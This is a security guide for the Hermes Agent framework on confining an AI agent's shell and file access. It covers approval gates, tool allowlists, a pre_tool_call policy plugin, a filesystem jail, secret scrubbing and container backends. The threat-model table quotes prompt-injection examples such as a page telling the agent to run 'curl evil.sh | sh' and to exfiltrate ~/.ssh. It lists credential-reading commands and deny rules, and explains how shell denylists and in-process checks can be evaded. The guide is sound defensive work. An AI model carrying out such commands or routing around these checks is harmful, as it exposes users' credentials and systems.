# Sandboxing the agent's bash and file access

An autonomous agent with a `terminal` (shell) tool and file tools can do anything
*you* can do on the host. This document is the security counterpart to
[`secrets.md`](secrets.md): secrets keeps credentials out of the agent's reach;
this keeps the agent's **actions** inside a boundary you chose.

It describes what Hermes Agent gives you **today** (real config keys, the approval
gate, terminal backends), the **plugin/guardrail pattern** for restoring a
Claude-Code-style permission model, and an honest account of what is and isn't a
real security boundary. Everything here uses portable placeholders (`HERMES_HOME`,
`~/`, `<repo>`); substitute your own paths.

> **The one-sentence version.** *In-process checks (approval gate, path scanners,
> tool allowlists) prevent **cooperative-mode accidents**. The only thing that
> contains an **adversarial** model is the operating system — a container, a
> sandbox, or a remote backend.* Build both layers, but know which is which.

---

## 1. Threat model — what an agent with a shell can do wrong

Order the threats by how much trust the agent's **input** carries, because that is
the dial that decides how much isolation you need.

| Mode | Trigger | Example failure | Real defense |
|---|---|---|---|
| **Cooperative mistake** | You asked for X; the model does X clumsily | `rm -rf` with a bad glob, writes a file to `/` because `cwd` was wrong, `chmod -R 777`, force-push to the wrong branch | Approval gate + filesystem jail (catches the common shapes) |
| **Confused-deputy / prompt injection** | The agent ingests untrusted content (a fetched web page, an inbound email, an MCP server response, a file it read) that contains instructions | Page text says "run `curl evil.sh \| sh`" and the model complies; a poisoned tool result tells it to exfiltrate `~/.ssh` | OS-level isolation. In-process scanners are operating on an attacker-controlled string and are *structurally* defeatable |
| **Credential theft** | Either mode above, aimed at secrets | `cat ~/.env`, read the keychain, dump a provider key into an HTTP request | Keep raw creds out of the process (see [`secrets.md`](secrets.md)); environment scrubbing reduces casual leaks but is **not** containment |
| **Network exfiltration / pivot** | Agent has unrestricted egress | POST stolen data anywhere; reach internal services on your LAN | Egress policy at the OS/container layer (allowlisted domains) |

Two facts to internalize before reading the rest:

1. **Shell is Turing-complete.** Any denylist of "dangerous command strings" is, by
   construction, incomplete — `r''m`, base64-decode-then-pipe, a wrapper script, a
   here-doc, a unicode homoglyph. A pattern gate is a speed-bump against mistakes,
   not a wall against an adversary.
2. **Anything loaded into the agent's Python process runs with the agent's full
   privileges.** Plugins, hooks, and skills are imported Python; they can read the
   same credentials and call the same tools as the agent. They are not sandboxed
   *from* the agent. The boundary for third-party plugins/skills is **review
   before install**, not a runtime check.

---

## 2. What hermes-agent offers today (config keys + flags)

These are the knobs that ship with hermes-agent. All live in
`$HERMES_HOME/config.yaml` unless noted; CLI flags override per-invocation.

### 2.1 The approval gate (`approvals.*`)

The agent detects common destructive shell patterns and, depending on mode,
**prompts you before running them**. This is the built-in cooperative-mistake
catcher.

```yaml
approvals:
  mode: manual          # manual = prompt the operator before a dangerous command
  timeout: 60           # seconds to wait for a decision
  cron_mode: deny       # how unattended cron jobs resolve a dangerous command:
                        #   deny (safest) — refuse and log, never auto-run
  mcp_reload_confirm: true
  destructive_slash_confirm: true
command_allowlist: []   # commands you have permanently approved (skips the prompt)
hooks_auto_accept: false
```

Important honesty flags around it:

- **`--yolo` / `HERMES_YOLO_MODE` disables the gate entirely.** Good agents
  freeze this at process start so a skill can't flip it mid-run, but treat YOLO as
  "no approval layer at all."
- **`-z/--oneshot` auto-bypasses approvals** (it's meant for non-interactive
  pipes). Don't pipe untrusted prompts into `-z` on the local backend.
- **Unattended contexts (cron, headless gateway) can't show a prompt.** That's why
  `cron_mode: deny` exists — an unattended job should *refuse* a dangerous command,
  not silently run it. Some builds expose a `subagent_auto_approve` style toggle;
  default it to deny.

A "smart approval" auxiliary model may be wired in (`auxiliary.approval`) to
auto-classify low-risk commands. Useful for ergonomics; remember it's another LLM
making a judgement call on an attacker-influenceable string — keep it on the
*accident* side of the ledger, not the *adversary* side.

### 2.2 Restricting which tools exist at all (`tools` / `platform_toolsets`)

The cleanest way to remove a capability is to not load the tool. hermes-agent
gates tools **per platform** (CLI vs. a messaging channel can have different sets):

```yaml
platform_toolsets:
  cli:
    - file
    - memory
    - web
    - terminal        # ← drop this line and the agent on this surface has NO shell
    # - code_execution  ← omitting code_execution removes the Python-exec tool too
```

```bash
hermes tools list                 # see enabled/disabled per platform
hermes tools disable terminal     # remove a toolset (or MCP tool: server:tool)
hermes tools enable web
```

This is genuinely effective for capability reduction — a surface with no
`terminal`/`code_execution`/`file` tool simply cannot run shell or write files.
The catch: it's all-or-nothing per tool. "Shell, but only inside `<repo>`" or
"shell, but not `curl`" is *not* expressible here — that's what the guardrail
pattern (§3) and the filesystem jail (§4) add.

### 2.3 Where the shell actually runs (`terminal.backend`) — the real boundary

This is the most important security setting. The `terminal` tool (and the file
tools, which are implemented on top of the shell contract) execute against a
**pluggable backend**:

```yaml
terminal:
  backend: local        # ← runs commands DIRECTLY on the host. No isolation.
  timeout: 180
```

Supported backends (names vary slightly by version, but the set is stable):

| `backend` | Where commands run | Isolation |
|---|---|---|
| `local` (default) | Your host, your user | **None** — full trust envelope |
| `ssh` | A remote server; agent code stays local | The remote host is the blast radius |
| `docker` | An isolated container | Filesystem/network confined to the container |
| `singularity` / Apptainer | HPC-style container | As above |
| `modal` / `daytona` | A cloud sandbox | Confined cloud VM |

For the `docker` backend, note these **security-relevant defaults**:

```yaml
terminal:
  backend: docker
  docker_image: "<a pinned image>"
  docker_mount_cwd_to_workspace: false   # OFF by default — your cwd is NOT exposed
  docker_run_as_host_user: false         # container runs as its own (non-root) user
  docker_forward_env: []                 # explicitly list env vars to forward in
  container_memory: 5120                 # MB — resource caps
  container_disk: 51200
  # docker_extra_args are appended AFTER the built-in security defaults
```

`docker_mount_cwd_to_workspace: false` is the safe default: the agent's shell can't
touch your project tree unless you opt in. `docker_forward_env: []` means
credentials are **not** carried into the container unless you name them — which
dovetails with secrets isolation (§5).

> **The load-bearing point.** Switching `backend` from `local` to a container/sandbox
> is the single change that turns "the agent can do anything I can" into "the agent
> can do anything *inside this box*." Everything in §3–§4 is accident-prevention
> layered **on top**; only the backend (or whole-process wrapping, §6) is a wall.

### 2.4 The `security` block + network egress

```yaml
security:
  allow_private_urls: false     # block the agent fetching RFC1918 / link-local URLs (SSRF guard)
  redact_secrets: true          # strip secret-like patterns from displayed output
  website_blocklist:
    enabled: false
    domains: []                 # domains the web tool refuses
  # a policy-engine hook (e.g. an external evaluator) may also be wired here,
  # fail-open by default — see your build's keys
```

`allow_private_urls: false` is a meaningful SSRF/pivot reduction (the agent can't
trivially curl `169.254.169.254` or your `10.x` services through the *web* tool).
`redact_secrets` is display-only — a determined producer of output defeats it, so
it's a convenience, not a control.

### 2.5 Troubleshooting / lockdown flags

| Flag | Effect | Security use |
|---|---|---|
| `--safe-mode` | Disable **all** customization: user config, AGENTS.md/memory injection, plugins, MCP. Implies the two below. | Boot a clean, minimal agent when you suspect a plugin/skill is misbehaving |
| `--ignore-user-config` | Ignore `config.yaml`, fall back to built-in defaults (`.env` creds still load) | Bypass a config you don't trust |
| `--ignore-rules` | Skip auto-injection of AGENTS.md / SOUL.md / `.cursorrules` / memory / preloaded skills | Stop untrusted instruction files from steering the agent |
| `--worktree` | Run inside an isolated git worktree | Limits accidental edits to a throwaway checkout (not a security boundary, but reduces blast radius) |

---

## 3. The plugin / guardrail pattern (Claude-Code-style permissions)

Out of the box in non-interactive CLI mode, hermes-agent is **allow-everything**
beyond the approval gate. If you want a finer, declarative deny/ask policy — the
equivalent of Claude Code's `settings.json` `permissions` — you can add it with a
**plugin that registers a `pre_tool_call` hook**. This is the portable pattern; the
mechanics, not anyone's private rule list, are what matters.

### The hook contract

hermes-agent fires lifecycle hooks around every tool call. A plugin registers a
callback on `pre_tool_call`; returning a block action **stops the tool from
running** (the analog of a Claude Code `PreToolUse` exit-2 deny). A `post_tool_call`
hook fires *after* execution and is the place for an audit log.

```python
# plugins/policy-gate/__init__.py  — illustrative skeleton, not a drop-in
def _on_pre_tool_call(tool_name=None, args=None, **kwargs):
    # Translate a declarative rule ("Bash(rm -rf /*)") into a check against
    # the concrete tool + its argument (terminal->command, write_file->path).
    if _matches_a_deny_rule(tool_name, args):
        return {"action": "block",
                "message": "Blocked by policy — a human must do this."}
    return None  # allow

def register(ctx) -> None:
    ctx.register_hook("pre_tool_call", _on_pre_tool_call)
```

### Design rules that make this pattern safe(r)

- **Map declarative rules to tools.** A Claude-Code-flavoured rule like
  `Bash(<glob>)` maps to the `terminal` tool's `command` arg; `Write/Edit(<glob>)`
  to `write_file`/`edit_file` `path`; `Read(<glob>)` to `read_file` `path`. Storing
  the policy in a familiar `permissions: { deny: [...], ask: [...] }` shape makes it
  reviewable.
- **`deny` = hard block. `ask` = hard block with a "a human must do this" reason**,
  because a non-interactive CLI has no one to prompt. (Interactive approval — a real
  in-chat "/approve" — is what the built-in approval gate, §2.1, is for; keep the two
  systems separate: use `ask` for *never-autonomously*, use the approval gate for
  *prompt-me-then-maybe*.)
- **Fail-open on the *plugin*, fail-closed on the *rule*.** A bug loading the policy
  file must never wedge every tool call — but a path/command that *matches* a deny
  rule must be blocked. (A malformed config shouldn't brick the agent; a matched rule
  shouldn't slip through.)
- **Cache by file mtime** so edits to the policy take effect mid-session without a
  restart, but you're not re-parsing on every call.
- **Audit, separately.** A `post_tool_call` hook that appends one line per executed
  command/edit to a gitignored `<repo>/logs/` file gives you the per-command audit
  trail hermes-agent doesn't keep by default. **Scrub secrets before writing** (env
  values, `password=`, `Authorization: Bearer`, `AKIA…`, URL creds, PEM blocks) — an
  audit log that records a leaked credential is its own breach.

### Steering vs. enforcing

There's a related, *softer* pattern worth distinguishing: a `pre_llm_call` hook can
**inject context** into the current turn (the analog of a Claude Code
`UserPromptSubmit` hook) to nudge tool discipline — e.g. "make the HTTP call
yourself with the terminal tool, don't ask the user to paste curl." This is
*steering*, not *enforcement*: it shapes behaviour but a model can ignore it. Use it
for ergonomics and reliability on weaker local models; never count it as a control.

> **Crucial caveat (don't skip).** This whole pattern runs **inside** the agent
> process. It is excellent at stopping the model from *cooperatively* doing
> something dumb. It does **not** contain an adversarial model or a malicious
> plugin — both run with full process privileges and can, in principle, route
> around an in-process check. It is a guardrail, not a jail. The jail is §4/§6.

---

## 4. Filesystem jail proposal (workspace / allowed-roots)

hermes-agent has no built-in "the agent may only write under these directories"
control. You can add one as part of the same `pre_tool_call` plugin (§3) — an
**allowed-roots** check scoped to the file-write tools.

### The shape

Keep it in the same policy file as the deny rules, in a section the plugin
understands:

```jsonc
{
  "permissions": { "deny": [ "Bash(*cookies.sqlite*)" ], "ask": [] },

  "fsjail": {
    "mode": "enforce",                  // "warn" = log-only dry-run; "enforce" = block
    "allowedRoots": [
      "~/work/code",                    // your project tree
      "/tmp", "/private/tmp",           // scratch
      "/var/folders"                    // macOS temp
    ],
    "denyOutsideRoots": true,
    "scopedTools": ["write_file", "edit_file", "patch"]
  }
}
```

### Enforcement logic (the rules that make it correct)

1. **Resolve the real path.** `expanduser` + `realpath` the tool's `path` arg so
   `../` and symlinks can't escape — compare the *resolved* absolute path against the
   *resolved* roots.
2. **Only check absolute paths.** If the path is relative, the `cwd` is unknown to the
   hook → skip the check (fail-open) rather than guess. (This is a real gap; see §7.)
3. **A path outside every root is a violation.** In `enforce` → return a block; in
   `warn` → append to `<repo>/logs/scope-violations.log` and allow (use `warn` first
   to tune your roots against a real session, then flip to `enforce`).
4. **Scope it to write tools.** Reads are usually fine to leave broad; it's
   *writes/patches* escaping the workspace that hurt. (If you also want to stop the
   agent *reading* outside the tree, add `read_file` to `scopedTools` — but know that
   on a `local` backend the `terminal` tool can still `cat` anything, so a read-jail
   that only covers `read_file` is mostly theatre. See the honesty box below.)

### Why this is still not a real jail on the `local` backend

The fsjail covers the **file tools**. It does **not** cover the **shell** — the
agent can `echo … > /etc/anything` or `cat ~/.ssh/id_rsa` through `terminal`
regardless of your allowed-roots, because that's a shell command, not a `write_file`
call. You'd have to *also* deny those shapes via the command deny-list (§3), and
shell denylists are incomplete by construction (§1).

> **The honest conclusion.** A filesystem jail in a `pre_tool_call` plugin is a
> strong **accident** preventer ("don't write outside my project") and a clean way
> to encode intent. For a *real* filesystem boundary that the shell also can't
> cross, you need the backend to be a container/sandbox (§2.3) whose mounts simply
> don't include the paths you're protecting. The plugin jail and the container are
> complementary: the plugin gives you ergonomic, hot-editable intent; the container
> gives you the wall.

---

## 5. Secrets isolation (tie-in to the secrets layer)

The agent should **never read raw credentials**. Two layers, both already in this
repo's story:

1. **At-rest + injection boundary** ([`secrets.md`](secrets.md)). Secrets live in a
   keychain / vault and are injected into the agent's environment **at launch** by
   `seckit run` / `op run`. The agent reads provider keys via env-var *name*
   (`key_env: LLM_API_KEY`), never a literal in YAML.
2. **Credential scoping into sub-processes.** hermes-agent strips provider keys and
   gateway tokens from the environment it hands to its **lower-trust children** —
   shell subprocesses, MCP subprocesses, cron scripts, the code-execution child — by
   default, forwarding only variables you (or a skill) explicitly declare. For the
   `docker` backend this is `docker_forward_env: []`; for the shell it's the
   env-passthrough allowlist.

**The honest limit (same as `secrets.md`).** Once Hermes is *launched*, the **agent
process itself** holds the real key in its environment, because it needs it to call
the model. Env-scrubbing stops the key from casually flowing into a shell command or
a container — it is **not** containment of the agent process. Anything running
*inside* that process (a plugin, a skill, a hook) can read it.

The only way to make "the agent literally cannot read the key" true is an **egress
proxy / boundary injection**: Hermes talks to a local proxy with *no* key in its
env; the proxy attaches the credential to the outbound provider request. That's the
roadmap item flagged in [`secrets.md`](secrets.md) and §7 here — it requires a proxy
(or a sandbox-native Provider store like OpenShell's), not a config flag.

Practical rules today:
- Keep keys in the keychain/vault, never in `config.yaml`, never committed
  (`.gitignore` already lists `.env`, `auth.json`, `*.db`).
- Forward the **minimum** env into shell/container/cron (`docker_forward_env`,
  passthrough allowlists).
- Run the agent as a **non-root** user; the shipped container image already does.

---

## 6. Whole-process wrapping (the strongest posture)

§2.3's terminal-backend isolation confines what the agent does **through the shell**.
It does **not** confine what the agent does in its **own Python process**:
code-execution (a host subprocess), MCP subprocesses, plugin/skill/hook loading.
When the agent ingests genuinely untrusted content (the open web, inbound email,
multi-user channels, untrusted MCP servers), wrap the **entire** process tree:

- **Run hermes-agent inside its own container** (the project ships a Docker image /
  Compose setup) with operator-configured mounts and a restrictive network policy.
  Every code path — shell, code-exec, MCP, file tools, plugins, hooks — is then
  subject to the same filesystem/network policy.
- **Per-session sandbox frameworks** (e.g. NVIDIA OpenShell) give declarative
  filesystem + L7 network egress + syscall policy per session, with **credentials
  injected from a provider store that never touches the sandbox filesystem** — i.e.
  the §5 egress-proxy idea, productized.

Choose by input trust: trusted operator + only worried about a clumsy `rm -rf` →
terminal-backend sandbox is enough. Ingesting untrusted content, or a shared/exposed
deployment → whole-process wrapping.

---

## 7. Honest gaps & roadmap

What's **real today** (config + a small plugin), what **needs a container/proxy**,
and what's a **roadmap** item:

| Goal | Status | How |
|---|---|---|
| Remove a capability entirely (no shell / no code-exec on a surface) | ✅ Today | `platform_toolsets` / `hermes tools disable` (§2.2) |
| Prompt before common destructive commands | ✅ Today | `approvals.mode: manual` + the gate (§2.1) — *accidents only* |
| Declarative deny/ask command + path policy (Claude-Code style) | ✅ Today, DIY | `pre_tool_call` plugin (§3) — *in-process, accident-grade* |
| "Agent may only write under `<roots>`" | ✅ Today, DIY | fsjail in the plugin (§4) — covers **file tools, not shell** |
| Per-command audit log with secret scrubbing | ✅ Today, DIY | `post_tool_call` plugin (§3) |
| Block agent fetching internal/private URLs | ✅ Today | `security.allow_private_urls: false` (§2.4) |
| Real filesystem boundary the **shell** also can't cross | 🐳 Needs container | `terminal.backend: docker/singularity/…` (§2.3) |
| Confine code-exec / MCP / plugin code paths too | 🐳 Needs whole-process wrap | Run hermes-agent in its container / OpenShell (§6) |
| Restrict network egress to an allowlist | 🐳 Needs container/sandbox | Container network policy / OpenShell L7 egress (§6) |
| Agent **never** holds the raw API key | 🛣️ Roadmap | Egress proxy / boundary injection / sandbox provider store (§5, and `secrets.md`) |
| Per-tool "shell but not `curl`" enforcement that an adversary can't bypass | 🛣️ Roadmap / not solvable in-process | Shell is Turing-complete; only a sandbox boundary is sound (§1, §4) |

### The three honesty rules to repeat to yourself

1. **In-process = accidents. OS = adversaries.** The approval gate, the policy
   plugin, and the fsjail stop the model from *cooperatively* doing harm. The
   container/sandbox is the only thing that stops a *prompt-injected* or
   *adversarial* model. Ship both; never confuse them.
2. **Shell beats denylists.** Any "dangerous command" pattern list is incomplete by
   construction. It's a speed-bump, valuable against mistakes, worthless as a wall.
3. **The process holds the keys.** Until you put an egress proxy or a sandbox
   provider store in front of inference, the launched agent — and anything loaded
   into it — can read the credentials in its environment. Plugins and skills are
   trusted code: review before install.

### Recommended starting posture for a standalone user

- **Default / local-only, trusted operator, no untrusted input:** `backend: local`
  + `approvals.mode: manual` + the §3 policy plugin in `enforce` + the §4 fsjail in
  `enforce` + secrets via `seckit`/`op` (§5) + non-root user. Good against mistakes.
- **You let it touch the open web / email / untrusted MCP:** move to
  `terminal.backend: docker` (or wrap the whole process, §6) with
  `docker_mount_cwd_to_workspace` and `docker_forward_env` minimal. Now you have a
  wall, not just guardrails.
- **Exposed / shared deployment:** whole-process wrapping + caller allowlists on
  every network adapter + egress policy. (Adapter auth is out of scope here; see the
  repo [`SECURITY.md`](../SECURITY.md) network-exposure notes and the upstream
  hermes-agent SECURITY policy.)
